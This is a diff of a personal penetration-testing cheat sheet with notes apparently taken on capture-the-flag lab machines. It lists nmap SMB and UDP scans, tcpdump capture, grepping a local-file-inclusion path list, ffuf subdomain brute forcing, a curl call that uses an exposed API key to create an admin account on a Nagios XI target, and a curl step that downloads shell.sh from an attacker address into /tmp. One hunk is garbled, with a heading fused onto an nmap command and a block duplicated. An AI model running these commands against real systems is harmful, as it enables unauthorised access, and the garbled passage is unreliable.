@@ -1,6 +1,11 @@
 cat ~/.*history | less     #to show history of hidden files
 cat a.txt, less a.txt      #cat and less to read files
 
+using cat to know the line number
+---------------------------------
+#cat -n lfi-linux-list.txt | grep "/etc/ssh"
+
+
 Identify FQDN of the Domain Controller
 #nmap --script=smb-os-discovery.nse 10.10.1.22
 
@@ -20,7 +25,9 @@ capture with tcpdump
 #tcpdump -i tun0 icmp
 
 Normal nmap scanning is TCP scanning, but some ports are opened in UDP session.
-#sudo nmap -sU -min-rate 5000 10.10.11.248
+#sudo nmap -sU -min-rate 5000 10.10.11.248using cat to know the line number
+---------------------------------
+#cat -n lfi-linux-list.txt | grep "/etc/ssh"
 
 smbenumeration
 --------------
@@ -125,6 +132,11 @@ Using admin api-key to create new admin-user account
 -----------------------------------------------------
 curl -POST -k "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" 
 -d "username=secjedi&password=secjedi&name=secjedi&email=secjedi@monitored.htb&auth_level=admin"
+
+To know HTTP response size (5829) in order to do subdomain bruteforcing
+-----------------------------------------------------------------------
+#curl -s -H "HOST:ksjfkjsdfjslk.vulnnet.thm" http://vulnnet.thm | wc -c
+#ffuf -w subdomains.txt -u "http://vulnnet.thm" -H "HOST:FUZZ.vulnnet.thm" -fs 5829
 
 curl can also be used as wget 
 #curl 10.4.52.17/shell.sh -o /tmp/shell.sh
